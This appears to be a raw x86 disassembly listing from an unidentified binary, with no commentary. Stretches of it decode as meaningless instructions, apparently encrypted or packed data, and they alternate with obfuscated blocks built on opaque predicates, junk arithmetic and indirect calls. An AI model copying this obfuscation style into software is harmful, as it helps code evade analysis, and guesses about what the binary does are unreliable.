  41c24a:	sti    
  41c24b:	mov    ebx,ds
  41c24d:	mov    ecx,0xc371ef4d
  41c252:	lods   eax,DWORD PTR ds:[esi]
  41c253:	dec    edx
  41c254:	adc    eax,0xbc6f82b7
  41c259:	mov    ds:0xc8d7ffa,eax
  41c25e:	les    edi,FWORD PTR [eax-0x7cd1f0be]
  41c264:	inc    esi
  41c265:	cmp    bh,BYTE PTR [edx+esi*8]
  41c268:	aaa    
  41c269:	add    BYTE PTR [esi],0xa
  41c26c:	pop    ds
  41c26d:	hlt    
  41c26e:	in     eax,0x72
  41c270:	sti    
  41c271:	into   
  41c272:	push   edx
  41c273:	push   es
  41c274:	mov    esp,0x9ef5ef8e
  41c279:	dec    esi
  41c27a:	push   0x35
  41c27c:	sbb    al,0x9d
  41c27e:	bound  edx,QWORD PTR [ebp+edi*2-0x69]
  41c282:	adc    BYTE PTR [eax+0x1e26709d],ch
  41c288:	adc    DWORD PTR [ecx],edx
  41c28a:	mov    DWORD PTR [edi+0x1b],ecx
  41c28d:	and    edi,DWORD PTR [esi+0xe3ab4fa]
  41c293:	out    dx,al
  41c294:	nop
  41c295:	icebp  
  41c296:	xchg   ebp,eax
  41c297:	jmp    0xa2e9:0xdb959298
  41c29e:	cmp    bl,BYTE PTR [ecx]
  41c2a0:	out    dx,al
  41c2a1:	xchg   esi,eax
  41c2a2:	or     edi,DWORD PTR [edx]
  41c2a4:	sub    DWORD PTR [ebx+eiz*4],edi
  41c2a7:	fs loop 0x41c2f7
  41c2aa:	adc    esp,ecx
  41c2ac:	lea    esp,[ebx+ebx*4-0x68]
  41c2b0:	lahf   
  41c2b1:	mov    ch,0xcc
  41c2b3:	stos   DWORD PTR es:[edi],eax
  41c2b4:	nop
  41c2b5:	retf   0xe584
  41c2b8:	shl    BYTE PTR [ecx+0x53b8bda2],1
  41c2be:	test   DWORD PTR [esi+esi*4],ebp
  41c2c1:	sti    
  41c2c2:	clc    
  41c2c3:	scas   eax,DWORD PTR es:[edi]
  41c2c4:	addr16 clc 
  41c2c6:	cmp    DWORD PTR [ebx],esp
  41c2c8:	mov    DWORD PTR [ebp+0x327fd17d],esi
  41c2ce:	neg    BYTE PTR [esi-0x23e2e0d0]
  41c2d4:	inc    ecx
  41c2d5:	pop    ebx
  41c2d6:	addr16 or al,0xa2
  41c2d9:	and    esi,DWORD PTR [esp+eax*1+0x2fe79153]
  41c2e0:	stos   BYTE PTR es:[edi],al
  41c2e1:	add    ecx,DWORD PTR [eax-0xd6f298c]
  41c2e7:	add    dh,BYTE PTR [ebx]
  41c2e9:	sub    eax,eax
  41c2eb:	jge    0x41c322
  41c2ed:	inc    esi
  41c2ee:	xor    BYTE PTR [edi+0x5268879],dh
  41c2f4:	int3   
  41c2f5:	dec    ebx
  41c2f6:	scas   al,BYTE PTR es:[edi]
  41c2f7:	xlat   BYTE PTR ds:[ebx]
  41c2f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2f9:	cmp    BYTE PTR [eax+0x826842d],0x8e
  41c300:	fcomp  st(0)
  41c302:	sub    cl,BYTE PTR [ebp+esi*8-0x75f50e8d]
  41c309:	dec    edi
  41c30a:	stos   DWORD PTR es:[edi],eax
  41c30b:	cld    
  41c30c:	inc    esp
  41c30d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c30e:	fistp  WORD PTR [ebp-0x1d04b34b]
  41c314:	xor    al,BYTE PTR [eax]
  41c316:	jbe    0x41c2ec
  41c318:	sub    BYTE PTR [edx-0x2b],0x35
  41c31c:	mov    WORD PTR [esi+0x0],ds
  41c31f:	add    BYTE PTR [ecx+0x3d19b845],cl
  41c325:	xchg   ebp,eax
  41c326:	test   BYTE PTR [edx+0x0],al
  41c329:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41c333:	mov    DWORD PTR [ebp-0x138],0x1169
  41c33d:	mov    DWORD PTR [ebp-0x12c],0x1379
  41c347:	sbb    DWORD PTR ds:0x428505,ecx
  41c34d:	mov    eax,DWORD PTR [ebp-0x12c]
  41c353:	adc    DWORD PTR ds:0x428479,0x44e5
  41c35d:	mov    ecx,0x5856
  41c362:	sub    ecx,eax
  41c364:	and    DWORD PTR ds:0x4283d5,ecx
  41c36a:	shr    ecx,0x2
  41c36d:	cmp    DWORD PTR ds:0x42851d,0x0
  41c374:	mov    DWORD PTR ds:0x4283c9,0x1c8e
  41c37e:	mov    DWORD PTR ds:0x4284a9,0x3a72
  41c388:	mov    DWORD PTR ds:0x4282ed,0x2994
  41c392:	jmp    0x41c475
  41c397:	mov    eax,ds:0x42848d
  41c39c:	cmp    DWORD PTR ds:0x42851d,0x0
  41c3a3:	jge    0x41c3d2
  41c3a9:	push   DWORD PTR [ebp-0x20]
  41c3ac:	push   DWORD PTR [ebp-0x24]
  41c3af:	push   DWORD PTR [ebp-0x1c]
  41c3b2:	call   DWORD PTR ds:0x42e120
  41c3b8:	and    DWORD PTR ds:0x4283b9,edx
  41c3be:	sub    DWORD PTR ds:0x428319,0x53c2
  41c3c8:	and    DWORD PTR ds:0x42831d,0x428529
  41c3d2:	or     DWORD PTR ds:0x4284f9,edi
  41c3d8:	sbb    DWORD PTR ds:0x428315,0x428505
  41c3e2:	cmp    DWORD PTR ds:0x428421,0x0
  41c3e9:	mov    DWORD PTR ds:0x4283f1,0x3b49
  41c3f3:	mov    DWORD PTR ds:0x428401,0x7933
  41c3fd:	mov    DWORD PTR ds:0x428415,0x897
  41c407:	mov    DWORD PTR ds:0x428309,0x5a92
  41c411:	jmp    0x41c475
  41c416:	mov    eax,0x55e0
  41c41b:	movzx  eax,WORD PTR ds:0x42847d
  41c422:	cmp    DWORD PTR ds:0x428421,0x0
  41c429:	ja     0x41c45f
  41c42f:	push   DWORD PTR [ebp-0x18]
  41c432:	push   DWORD PTR [ebp-0x18]
  41c435:	push   DWORD PTR [ebp-0x18]
  41c438:	push   DWORD PTR [ebp-0x20]
  41c43b:	push   0x8c53
  41c440:	push   DWORD PTR [ebp-0x14]
  41c443:	call   DWORD PTR ds:0x42e068
  41c449:	add    DWORD PTR ds:0x4283b5,ecx
  41c44f:	not    DWORD PTR ds:0x428489
  41c455:	adc    DWORD PTR ds:0x4283f9,0x2c56
  41c45f:	add    DWORD PTR ds:0x4284a5,0x4283dd
  41c469:	add    DWORD PTR ds:0x4283bd,edi
  41c46f:	sub    DWORD PTR ds:0x42842d,edx
  41c475:	sub    ecx,0x5be6
  41c47b:	mov    eax,DWORD PTR [ebp-0x138]
  41c481:	xor    DWORD PTR ds:0x4283e5,0x2de
  41c48b:	imul   ecx,eax
  41c48e:	mov    eax,ds:0x428415
  41c493:	add    DWORD PTR ds:0x42852d,eax
  41c499:	mov    eax,DWORD PTR [ebp-0x13c]
  41c49f:	and    ecx,eax
  41c4a1:	cmp    DWORD PTR ds:0x428529,0x0
  41c4a8:	mov    DWORD PTR ds:0x42840d,0x420b
  41c4b2:	mov    DWORD PTR ds:0x428489,0x3ab4
  41c4bc:	mov    DWORD PTR ds:0x428429,0x3618
  41c4c6:	jmp    0x41c90c
  41c4cb:	mov    DWORD PTR ds:0x4283c9,0xf37
  41c4d5:	not    eax
  41c4d7:	cmp    DWORD PTR ds:0x428529,0x0
  41c4de:	jg     0x41c505
  41c4e4:	push   0x2612
  41c4e9:	push   DWORD PTR [ebp-0x1c]
  41c4ec:	push   DWORD PTR [ebp-0x14]
  41c4ef:	call   DWORD PTR ds:0x42e06c
  41c4f5:	and    DWORD PTR ds:0x428409,0x428499
  41c4ff:	add    DWORD PTR ds:0x4282fd,edi
  41c505:	xor    DWORD PTR ds:0x4283cd,edx
  41c50b:	sbb    DWORD PTR ds:0x428415,0x428405
  41c515:	mov    DWORD PTR ds:0x428429,0x491d
  41c51f:	add    DWORD PTR ds:0x428301,ebx
  41c525:	jmp    0x41c90c
  41c52a:	sub    ch,BYTE PTR [esi-0x62]
  41c52d:	sbb    DWORD PTR [edx-0x7c9145e7],edi
  41c533:	pop    ebp
  41c534:	and    al,0x9e
  41c536:	mov    cl,0xe1
  41c538:	adc    bl,BYTE PTR [esi-0x413fbea0]
  41c53e:	dec    edx
  41c53f:	les    edi,FWORD PTR [esi+0x166a47be]
  41c545:	mov    edx,ebx
  41c547:	dec    esi
  41c548:	data16 mov dh,0x3a
  41c54b:	int    0x12
  41c54d:	call   0xdca2:0x51552956
  41c554:	leave  
  41c555:	in     eax,dx
  41c556:	scas   eax,DWORD PTR es:[edi]
  41c557:	cwde   
  41c558:	sbb    al,0x15
  41c55a:	sahf   
  41c55b:	fisttp DWORD PTR [edx-0x7d]
  41c55e:	scas   al,BYTE PTR es:[edi]
  41c55f:	mul    ecx
  41c561:	mov    al,ds:0x8e313542
  41c566:	xchg   edx,eax
  41c567:	xchg   DWORD PTR [edx],edx
  41c569:	xchg   esp,eax
  41c56a:	xchg   ecx,eax
  41c56b:	in     eax,0xcf
  41c56d:	mov    cl,BYTE PTR [edx+0x7]
  41c570:	loopne 0x41c599
  41c572:	fisub  DWORD PTR [ecx+0x5c]
  41c575:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c576:	jmp    0xaf89:0xabfb7c2d
  41c57d:	mov    ds:0xdf49ebe2,eax
  41c582:	jnp    0x41c5ed
  41c584:	add    bl,BYTE PTR [edi+eiz*8]
  41c587:	imul   ebx,DWORD PTR [edi],0xf
  41c58a:	and    BYTE PTR [ebp+0x360d9b8c],bh
  41c590:	out    dx,al
  41c591:	nop
  41c592:	push   ds
  41c593:	stos   BYTE PTR es:[edi],al
  41c594:	xor    al,0x37
  41c596:	xlat   BYTE PTR ds:[ebx]
  41c597:	pusha  
  41c598:	xchg   ebx,eax
  41c599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c59a:	pop    ss
  41c59b:	add    ah,BYTE PTR ds:0x26bfab87
  41c5a1:	into   
  41c5a2:	xchg   esp,eax
  41c5a3:	mov    eax,0x76b0614f
  41c5a8:	xor    DWORD PTR [ebp+0x70],ebp
  41c5ab:	push   eax
  41c5ac:	jmp    0x41c583
  41c5ae:	cmp    eax,eax
  41c5b0:	stos   DWORD PTR es:[edi],eax
  41c5b1:	(bad)  
  41c5b2:	pop    edi
  41c5b3:	test   al,0xc0
  41c5b5:	or     edx,0x735f0702
  41c5bb:	aad    0xa2
  41c5bd:	jle    0x41c59b
  41c5bf:	inc    edx
  41c5c0:	jmp    0xcadef09a
  41c5c5:	shr    cl,0x39
  41c5c8:	fcom   QWORD PTR [eax-0x51d80fa7]
  41c5ce:	loop   0x41c564
  41c5d0:	mov    al,ds:0x61bc5922
  41c5d5:	int    0xe4
  41c5d7:	(bad)  
  41c5d8:	sbb    BYTE PTR [esi],ch
  41c5da:	loopne 0x41c5e7
  41c5dc:	in     eax,dx
  41c5dd:	cwde   
  41c5de:	repnz cs aaa 
  41c5e1:	dec    esp
  41c5e2:	sti    
  41c5e3:	or     esi,eax
  41c5e5:	jg     0x41c64d
  41c5e7:	pop    esp
  41c5e8:	mul    DWORD PTR [ebx-0x67f729a5]
  41c5ee:	or     ebp,DWORD PTR [ebx+0x4e]
  41c5f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5f2:	sbb    edx,edi
  41c5f4:	mov    edx,0x25e7b822
  41c5f9:	adc    dl,BYTE PTR [ebx+0x54]
  41c5fc:	cwde   
  41c5fd:	aad    0xf8
  41c5ff:	xchg   esi,eax
  41c600:	fucomp st(4)
  41c602:	xor    bh,ch
  41c604:	jl     0x41c665
  41c606:	push   eax
  41c607:	pop    esp
  41c608:	rcr    DWORD PTR [ebx],cl
  41c60a:	push   ebx
  41c60b:	and    ebx,ebx
  41c60d:	push   0xf3c38d3f
  41c612:	shl    bl,1
  41c614:	enter  0x4316,0xf2
  41c618:	inc    esp
  41c619:	mov    esi,0x91d5909a
  41c61e:	pusha  
  41c61f:	sub    BYTE PTR [edx-0x24],dl
  41c622:	bound  eax,QWORD PTR [ebp-0x4927fe9f]
  41c628:	aad    0x70
  41c62a:	repnz sti 
  41c62c:	cld    
  41c62d:	mov    esp,0x7661db9
  41c632:	xchg   DWORD PTR [edx-0x5e],ebx
  41c635:	mov    dl,0x17
  41c637:	pop    ds
  41c638:	push   ebp
  41c639:	jbe    0x41c618
  41c63b:	mov    ds,edi
  41c63d:	mov    al,ds:0xa01e9620
  41c642:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c644:	sub    bh,bl
  41c646:	call   0x472:0x5a29b5f5
  41c64d:	add    dl,BYTE PTR [edx]
  41c64f:	(bad)  
  41c650:	fmul   st,st(2)
  41c652:	sub    eax,0x7aeabbe0
  41c657:	xchg   DWORD PTR [ecx],ecx
  41c659:	add    eax,0x2332f114
  41c65e:	inc    esi
  41c65f:	mov    ebp,0xfdfa489a
  41c664:	add    esp,DWORD PTR [eax*4-0x163afab8]
  41c66b:	stos   DWORD PTR es:[edi],eax
  41c66c:	std    
  41c66d:	xor    eax,0xcd16d00f
  41c672:	dec    ecx
  41c673:	sbb    dl,ch
  41c675:	sti    
  41c676:	xor    edi,ebx
  41c678:	stos   DWORD PTR es:[edi],eax
  41c679:	jb     0x41c6b3
  41c67b:	sub    BYTE PTR [ecx+eiz*1],bl
  41c67e:	sub    al,0x21
  41c680:	xlat   BYTE PTR ds:[ebx]
  41c681:	lock shr DWORD PTR [edx+0xd],0xa0
  41c686:	clc    
  41c687:	dec    ecx
  41c688:	scas   al,BYTE PTR es:[edi]
  41c689:	sbb    DWORD PTR [ebx+ebp*4],eax
  41c68c:	mov    esi,0xcb3992c8
  41c691:	cmp    edi,DWORD PTR [ecx+0x156913ed]
  41c697:	mov    esp,0x918a7cbf
  41c69c:	repnz mov al,ds:0xaae4d0a0
  41c6a2:	or     ah,BYTE PTR ds:0x1c35c894
  41c6a8:	pop    edi
  41c6a9:	push   ds
  41c6aa:	loop   0x41c65b
  41c6ac:	sub    BYTE PTR ds:[esi+ebp*8],dh
  41c6b0:	jle    0x41c71a
  41c6b2:	push   ebx
  41c6b3:	loop   0x41c72d
  41c6b5:	sar    ecx,cl
  41c6b7:	(bad)
  41c6ba:	sub    al,0x75
  41c6bc:	jbe    0x41c641
  41c6be:	fistp  DWORD PTR [edx]
  41c6c0:	sbb    BYTE PTR [ecx-0x50],ch
  41c6c3:	pop    edi
  41c6c4:	jb     0x41c6a2
  41c6c6:	fwait
  41c6c7:	pop    esi
  41c6c8:	daa    
  41c6c9:	call   0x63e96c32
  41c6ce:	outs   dx,BYTE PTR ds:[esi]
  41c6cf:	pop    es
  41c6d0:	addr16 mov ds:0x2ae9,al
  41c6d4:	push   ecx
  41c6d5:	cmp    ebp,0xc82b7773
  41c6db:	or     eax,0xa72d1c5
  41c6e0:	inc    ebx
  41c6e1:	stos   DWORD PTR es:[edi],eax
  41c6e2:	lods   eax,DWORD PTR ds:[esi]
  41c6e3:	mov    esp,0x2d02f36e
  41c6e8:	pop    ecx
  41c6e9:	xchg   edi,eax
  41c6ea:	or     eax,0x4b41c131
  41c6ef:	xchg   ecx,eax
  41c6f0:	pop    ebp
  41c6f1:	repnz cmp ebp,DWORD PTR ds:0xdf0254b0
  41c6f8:	imul   edi,ecx,0xbcc89881
  41c6fe:	or     BYTE PTR [esi+0x37697835],0x4e
  41c705:	test   eax,0x16b20eeb
  41c70a:	ins    DWORD PTR es:[edi],dx
  41c70b:	mov    cs,esp
  41c70d:	aam    0x98
  41c70f:	jl     0x41c738
  41c711:	and    esp,edx
  41c713:	rol    bl,1
  41c715:	mov    ebp,0xb1add0c4
  41c71a:	mov    ecx,0x400f0005
  41c71f:	mov    BYTE PTR [eax],dh
  41c721:	stc    
  41c722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c723:	xchg   ecx,eax
  41c724:	out    dx,eax
  41c725:	jecxz  0x41c70a
  41c727:	data16 lods al,BYTE PTR ds:[esi]
  41c729:	in     eax,0x77
  41c72b:	cmp    eax,0x1c7c1d9e
  41c730:	aam    0xf9
  41c732:	lahf   
  41c733:	nop
  41c734:	stc    
  41c735:	mov    ah,BYTE PTR [esi-0x7b1dab5b]
  41c73b:	fsubr  DWORD PTR [ebp+0x5197ecea]
  41c741:	inc    esp
  41c742:	sbb    bx,bp
  41c745:	push   0xb3835aff
  41c74a:	in     eax,dx
  41c74b:	in     al,0xfb
  41c74d:	(bad)  
  41c74e:	std    
  41c74f:	fidiv  DWORD PTR [eax-0x438ec907]
  41c755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c756:	in     eax,dx
  41c757:	xor    cl,BYTE PTR [ecx]
  41c759:	outs   dx,DWORD PTR ds:[esi]
  41c75a:	add    bl,BYTE PTR [esi+0x7a]
  41c75d:	popa   
  41c75e:	inc    edx
  41c75f:	xor    al,al
  41c761:	mov    eax,ds:0x1da36360
  41c766:	mov    esi,0x8d0b5e66
  41c76b:	shl    bh,cl
  41c76d:	inc    edi
  41c76e:	mov    ds:0xe8787951,al
  41c773:	mov    WORD PTR [esi+0x61],fs
  41c776:	mov    WORD PTR [ebp+0x206232ed],?
  41c77c:	or     eax,0x7daeeff1
  41c781:	adc    ebx,DWORD PTR [esi+0x48df8052]
  41c787:	inc    edx
  41c788:	loop   0x41c7e2
  41c78a:	jp     0x41c74f
  41c78c:	addr16 out dx,eax
  41c78e:	xchg   BYTE PTR [ebx-0x50],ch
  41c791:	imul   ecx,DWORD PTR [ecx+0x5f02d525],0x40
  41c798:	mov    BYTE PTR [eax-0x45e53a82],dl
  41c79e:	outs   dx,DWORD PTR ds:[esi]
  41c79f:	test   eax,0x42a6dafd
  41c7a4:	xor    dl,ch
  41c7a6:	adc    eax,0xbcc3802b
  41c7ab:	retf   
  41c7ac:	dec    esp
  41c7ad:	mov    ds:0xeae1abfd,al
  41c7b2:	jmp    0x41c7b7
  41c7b4:	sar    ch,1
  41c7b6:	jecxz  0x41c7f6
  41c7b8:	and    al,BYTE PTR [edi+0x34]
  41c7bb:	cmp    DWORD PTR ds:0x59d6e5e9,ebx
  41c7c1:	pop    ebp
  41c7c2:	adc    DWORD PTR [eax+esi*4-0x69],edi
  41c7c6:	cwde   
  41c7c7:	xchg   ebx,eax
  41c7c8:	mov    bh,0x8e
  41c7ca:	sbb    bl,BYTE PTR [eax-0x599bb020]
  41c7d0:	lock shl esi,0xdd
  41c7d4:	jo     0x41c75d
  41c7d6:	hlt    
  41c7d7:	inc    DWORD PTR [esi]
  41c7d9:	and    BYTE PTR [esi],ch
  41c7db:	(bad)  [ecx]
  41c7dd:	cmp    ebx,DWORD PTR [ebx]
  41c7df:	lahf   
  41c7e0:	scas   al,BYTE PTR es:[edi]
  41c7e1:	stos   DWORD PTR es:[edi],eax
  41c7e2:	test   edi,ebx
  41c7e4:	fldenv [edi+0x50dda6f8]
  41c7ea:	sbb    BYTE PTR [edi],0x58
  41c7ed:	push   ebx
  41c7ee:	cld    
  41c7ef:	xlat   BYTE PTR ds:[ebx]
  41c7f0:	js     0x41c7e8
  41c7f2:	loop   0x41c834
  41c7f4:	jmp    0x2ce51291
  41c7f9:	cmc    
  41c7fa:	repnz ds loopne 0x41c7fa
  41c7fe:	int3   
  41c7ff:	adc    ebp,DWORD PTR [esi+0xbc0e248]
  41c805:	dec    esp
  41c806:	mov    dl,0xd0
  41c808:	jl     0x41c878
  41c80a:	mul    BYTE PTR [edi+0x29]
  41c80d:	sub    al,0x6
  41c80f:	retf   0xb404
  41c812:	call   0x6dda:0x446663ed
  41c819:	ja     0x41c84c
  41c81b:	paddw  mm2,QWORD PTR [ebx+0x75a5397a]
  41c822:	mov    al,ds:0x1040e190
  41c827:	sbb    eax,0x5c5f6264
  41c82c:	js     0x41c820
  41c82e:	mov    esp,0x4ef09f84
  41c833:	add    ebx,DWORD PTR [esi+0x5a]
  41c836:	mov    dl,0x6e
  41c838:	jecxz  0x41c830
  41c83a:	fisttp DWORD PTR [edx+0x10f97b6]
  41c840:	mov    cl,0xd8
  41c842:	jne    0x41c831
  41c844:	aas    
  41c845:	(bad)  
  41c846:	outs   dx,BYTE PTR ds:[esi]
  41c847:	pop    eax
  41c848:	imul   BYTE PTR [edi+0x1a]
  41c84b:	cli    
  41c84c:	in     al,dx
  41c84d:	enter  0x892d,0xcc
  41c851:	xchg   esp,eax
  41c852:	mov    DWORD PTR [esi+0x63],esi
  41c855:	outs   dx,BYTE PTR ds:[esi]
  41c856:	push   edi
  41c857:	push   edi
  41c858:	out    0x24,al
  41c85a:	xchg   ebx,eax
  41c85b:	cmp    BYTE PTR [edi],dh
  41c85d:	dec    esp
  41c85e:	int3   
  41c85f:	mov    BYTE PTR ds:0x8beb12d,bh
  41c865:	sub    BYTE PTR [eax-0x2],dl
  41c868:	ficomp WORD PTR [ebx+0x38]
  41c86b:	or     ebx,DWORD PTR [ebp+edx*2+0x1a8946dd]
  41c872:	push   ecx
  41c873:	mov    dh,0x32
  41c875:	push   esi
  41c876:	inc    esi
  41c877:	fst    QWORD PTR [edx-0x161cfa34]
  41c87d:	aaa    
  41c87e:	or     eax,0x231b1d25
  41c883:	and    DWORD PTR [ecx+edi*4-0x4f],ecx
  41c887:	dec    esi
  41c888:	xor    DWORD PTR [ecx-0x7778752c],eax
  41c88e:	addr16 inc ebx
  41c890:	mov    cr4,esp
  41c893:	add    BYTE PTR [ebx+0x6fea944a],dh
  41c899:	jecxz  0x41c8f0
  41c89b:	lods   eax,DWORD PTR ds:[esi]
  41c89c:	mov    bh,0x27
  41c89e:	mov    ch,0x8a
  41c8a0:	lahf   
  41c8a1:	add    ch,dl
  41c8a3:	mov    ds:0x2344cea1,eax
  41c8a8:	mov    ebx,0xdd29ec45
  41c8ad:	or     BYTE PTR [esi-0x2e],bh
  41c8b0:	jle    0x41c841
  41c8b2:	push   0x63
  41c8b4:	xchg   ebx,eax
  41c8b5:	xor    al,0x51
  41c8b7:	pop    es
  41c8b8:	aad    0x1e
  41c8ba:	popa   
  41c8bb:	pop    ds
  41c8bc:	adc    eax,DWORD PTR [eax+0x1e2dfc93]
  41c8c2:	js     0x41c8a0
  41c8c4:	mov    eax,ds:0xaaad1f4c
  41c8c9:	mov    edi,0x335546f1
  41c8ce:	mov    esp,ds
  41c8d0:	(bad)  
  41c8d1:	xor    ah,BYTE PTR [ecx+0x35279f82]
  41c8d7:	sub    esi,ebx
  41c8d9:	(bad)  
  41c8da:	ins    DWORD PTR es:[edi],dx
  41c8db:	and    edx,eax
  41c8dd:	jns    0x41c892
  41c8df:	in     al,dx
  41c8e0:	push   0x5144153c
  41c8e5:	xchg   esp,eax
  41c8e6:	push   esp
  41c8e7:	and    DWORD PTR [edx-0x2aee8985],esp
  41c8ed:	fbld   TBYTE PTR [esi]
  41c8ef:	and    BYTE PTR [edi+ebx*4],al
  41c8f2:	stc    
  41c8f3:	(bad)  
  41c8f4:	outs   dx,BYTE PTR ds:[esi]
  41c8f5:	jge    0x41c8ba
  41c8f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8f8:	call   0x8899965
  41c8fd:	adc    BYTE PTR [esi+ebp*1-0xee6aeee],al
  41c904:	sbb    eax,0xf6333ce1
  41c909:	out    0xc2,al
  41c90b:	pop    edi
  41c90c:	mov    eax,0x3b18
  41c911:	or     DWORD PTR ds:0x42852d,0x4283c5
  41c91b:	sub    eax,ecx
  41c91d:	mov    ecx,DWORD PTR ds:0x42842d
  41c923:	sbb    ecx,DWORD PTR ds:0x428489
  41c929:	mov    DWORD PTR ds:0x42842d,ecx
  41c92f:	mov    DWORD PTR [ebp-0xfc],eax
  41c935:	movzx  eax,BYTE PTR ds:0x428309
  41c93c:	sub    eax,DWORD PTR ds:0x4282e9
  41c942:	mov    ds:0x428309,eax
  41c947:	mov    DWORD PTR [ebp-0x28],0x16d7
  41c94e:	mov    DWORD PTR [ebp-0x134],0x6b4
  41c958:	mov    eax,DWORD PTR [ebp-0x134]
  41c95e:	cmp    DWORD PTR ds:0x42852d,0x0
  41c965:	mov    ecx,0x4723
  41c96a:	mov    DWORD PTR ds:0x4282f1,0x48a0
  41c974:	jmp    0x41c9c9
  41c979:	mov    ecx,0x5cee
  41c97e:	cmp    DWORD PTR ds:0x42852d,0x0
  41c985:	jl     0x41c9b9
  41c98b:	push   0x8e3c
  41c990:	call   DWORD PTR ds:0x42e070
  41c996:	movzx  ecx,BYTE PTR ds:0x42842d
  41c99d:	sbb    DWORD PTR ds:0x428419,ecx
  41c9a3:	xor    DWORD PTR ds:0x42851d,edx
  41c9a9:	mov    DWORD PTR ds:0x428491,0x54fa
  41c9b3:	adc    DWORD PTR ds:0x428405,ebx
  41c9b9:	xor    ecx,DWORD PTR ds:0x428515
  41c9bf:	sub    DWORD PTR ds:0x4283e1,0x73c7
  41c9c9:	or     eax,0x4f70
  41c9ce:	cmp    DWORD PTR ds:0x4283dd,0x0
  41c9d5:	mov    ecx,0x6758
  41c9da:	mov    ecx,0x329e
  41c9df:	mov    DWORD PTR ds:0x428475,ecx
  41c9e5:	mov    DWORD PTR ds:0x428419,edi
  41c9eb:	jmp    0x41ca37
  41c9f0:	mov    DWORD PTR ds:0x428315,0x5f4d
  41c9fa:	cmp    DWORD PTR ds:0x4283dd,0x0
  41ca01:	jae    0x41ca29
  41ca07:	push   0x67b2
  41ca0c:	push   0x4f13
  41ca11:	call   DWORD PTR ds:0x42e074
  41ca17:	add    ecx,0x3ae9
  41ca1d:	sub    ecx,DWORD PTR ds:0x428309
  41ca23:	xor    ecx,DWORD PTR ds:0x4283dd
  41ca29:	adc    DWORD PTR ds:0x4282dd,ecx
  41ca2f:	adc    ecx,DWORD PTR ds:0x4283dd
  41ca35:	not    ecx
  41ca37:	mov    ecx,DWORD PTR [ebp-0x28]
  41ca3a:	or     DWORD PTR ds:0x42842d,0x428411
  41ca44:	or     eax,ecx
  41ca46:	xor    ecx,ecx
  41ca48:	xor    ecx,DWORD PTR ds:0x428311
  41ca4e:	xor    DWORD PTR ds:0x428501,ecx
  41ca54:	sub    eax,0x5ff7
  41ca59:	mov    ecx,DWORD PTR ds:0x428309
  41ca5f:	sub    ecx,DWORD PTR ds:0x428499
  41ca65:	mov    DWORD PTR ds:0x428309,ecx
  41ca6b:	mov    DWORD PTR [ebp-0xc8],eax
  41ca71:	sub    DWORD PTR ds:0x4284b1,0xac
  41ca7b:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41ca85:	cmp    DWORD PTR ds:0x4283f5,0x0
  41ca8c:	mov    DWORD PTR ds:0x428301,edi
  41ca92:	mov    DWORD PTR ds:0x4283cd,edx
  41ca98:	jmp    0x41cafc
  41ca9d:	mov    DWORD PTR ds:0x4283d9,edx
  41caa3:	mov    DWORD PTR ds:0x4284a9,ebx
  41caa9:	cmp    DWORD PTR ds:0x4283f5,0x0
  41cab0:	jbe    0x41cad5
  41cab6:	push   DWORD PTR [ebp-0x1c]
  41cab9:	call   DWORD PTR ds:0x42e128
  41cabf:	sub    DWORD PTR ds:0x4284b1,edi
  41cac5:	xor    ecx,ecx
  41cac7:	add    ecx,DWORD PTR ds:0x428541
  41cacd:	mov    ecx,DWORD PTR [ecx]
  41cacf:	adc    DWORD PTR ds:0x42840d,ecx
  41cad5:	and    ecx,DWORD PTR ds:0x428501
  41cadb:	sub    ecx,ecx
  41cadd:	xor    ecx,ecx
  41cadf:	or     ecx,DWORD PTR ds:0x428509
  41cae5:	and    ecx,DWORD PTR ds:0x428411
  41caeb:	mov    DWORD PTR ds:0x428509,ecx
  41caf1:	adc    ecx,DWORD PTR ds:0x4283b9
  41caf7:	or     eax,0x53d3
  41cafc:	mov    DWORD PTR [ebp-0xc4],0x6236
  41cb06:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41cb0d:	jmp    0x41cef4
  41cb12:	pop    ebx
  41cb13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb14:	jmp    0x31aa:0x7b9c3cd8
  41cb1b:	add    al,0x9a
  41cb1d:	jecxz  0x41cab7
  41cb1f:	test   DWORD PTR [eax],ecx
  41cb21:	xchg   edx,eax
  41cb22:	jmp    0x41cb6d
  41cb24:	sar    BYTE PTR [esi-0x41413bb6],0xef
  41cb2b:	(bad)  
  41cb2c:	jecxz  0x41cb0a
  41cb2e:	cmp    al,0x19
  41cb30:	adc    BYTE PTR [ecx-0x74],bl
  41cb33:	loopne 0x41cb8b
  41cb35:	arpl   WORD PTR [edx],ax
  41cb37:	ins    BYTE PTR es:[edi],dx
  41cb38:	les    esp,FWORD PTR [ecx]
  41cb3a:	inc    ecx
  41cb3b:	or     BYTE PTR [ebx+0x14de7365],dl
  41cb41:	imul   esi,DWORD PTR [eax],0xffffffbe
  41cb44:	cmc    
  41cb45:	inc    eax
  41cb46:	inc    ebx
  41cb47:	jo     0x41cb25
  41cb49:	pop    eax
  41cb4a:	shr    BYTE PTR [ecx-0x7a1b5869],0x7c
  41cb51:	inc    edi
  41cb52:	hlt    
  41cb53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb54:	mov    ecx,0x22187303
  41cb59:	pop    ss
  41cb5a:	add    BYTE PTR [eax-0x466115ea],dh
  41cb60:	(bad)  
  41cb61:	into   
  41cb62:	sbb    DWORD PTR [ebx+0x64],ebx
  41cb65:	xchg   BYTE PTR [ebx+0x4f],bl
  41cb68:	clc    
  41cb69:	test   DWORD PTR [ecx],esp
  41cb6b:	inc    ebp
  41cb6c:	outs   dx,DWORD PTR ds:[esi]
  41cb6d:	dec    ebp
  41cb6e:	in     eax,0x67
  41cb70:	sbb    al,0xc4
  41cb72:	push   ebp
  41cb73:	lock mov bh,0x5b
  41cb76:	mov    edx,0x2f25be55
